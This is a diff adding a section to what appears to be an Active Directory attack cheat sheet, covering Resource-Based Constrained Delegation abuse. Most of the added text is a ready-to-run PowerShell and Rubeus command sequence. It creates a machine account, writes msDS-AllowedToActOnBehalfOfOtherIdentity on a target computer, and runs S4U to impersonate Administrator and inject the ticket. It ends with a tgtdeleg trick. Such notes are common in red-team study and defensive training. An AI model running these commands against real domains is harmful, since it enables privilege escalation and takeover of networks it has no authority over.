@@ -898,7 +898,31 @@ Inject PTT:
 OR
 
 ``` Rubeus.exe ptt /ticket:C:\Windows\System32\TGS_LDAP_adminsrv$<snip>_.kirbi ```
+* * *
 
+# Resouce-Based Constrained Delegation
+in RBCD its the backend service which sets the delegation parameters
+for this we need GenericWrite privileges on an RBCD server so, we can update the msDS-AllowedToActOnBehalfOfOtherIdentity and add the SID of a different computer.
+
+we can create a new machine account, create a sid then set it
+
+```
+Get-DomainComputer -Identity appsrv01 | Set-DomainObject -Set @{'msds- allowedtoactonbehalfofotheridentity'=$SDBytes}
+```
+the n run s4u as before - 
+
+```
+New-MachineAccount -MachineAccount <MachineAccountName> -Password $(ConvertTo-SecureString 'p@ssword!' -AsPlainText -Force) -Verbose
+$ComputerSid = Get-DomainComputer <MachineAccountName> -Properties objectsid | Select -Expand objectsid
+$SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$($ComputerSid))"
+$SDBytes = New-Object byte[] ($SD.BinaryLength)
+$SD.GetBinaryForm($SDBytes, 0)
+Get-DomainComputer TargetMachine | Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes} -Verbose
+Rubeus.exe hash /password:'p@ssword!'
+Rubeus.exe s4u /user:<MachineAccountName> /rc4:<RC4HashOfMachineAccountPassword> /impersonateuser:Administrator /msdsspn:cifs/TargetMachine.wtver.domain /domain:wtver.domain /ptt
+```
+
+In Constrain and Resource-Based Constrained Delegation if we don't have the password/hash of the account with TRUSTED_TO_AUTH_FOR_DELEGATION that we try to abuse, we can use the very nice trick "tgt::deleg" from kekeo or "tgtdeleg" from rubeus and fool Kerberos to give us a valid TGT for that account. Then we just use the ticket instead of the hash of the account to perform the attack.
 
 
 # DNS Admins
